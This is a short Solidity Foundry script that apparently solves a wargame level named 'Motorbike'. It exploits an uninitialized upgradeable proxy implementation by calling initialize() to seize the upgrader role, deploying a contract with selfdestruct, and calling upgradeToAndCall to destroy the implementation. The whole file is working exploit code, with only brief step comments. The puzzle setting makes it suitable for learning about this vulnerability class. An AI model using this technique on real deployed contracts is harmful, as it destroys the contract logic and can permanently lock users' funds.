// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Script.sol";

interface IEngine {
    function initialize() external;
    function upgradeToAndCall(address newImplementation, bytes calldata data) external;
}

contract Attack {
    function destroy() external {
        selfdestruct(payable(msg.sender));
    }
}

contract MotorbikeSolution is Script {

    function run() external {
        address engineAddr = 0xYOUR_ENGINE_ADDRESS;

        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        IEngine engine = IEngine(engineAddr);

        // 1. Become upgrader
        engine.initialize();

        // 2. Deploy malicious contract
        Attack attack = new Attack();

        // 3. Destroy implementation
        engine.upgradeToAndCall(
            address(attack),
            abi.encodeWithSignature("destroy()")
        );

        vm.stopBroadcast();
    }
}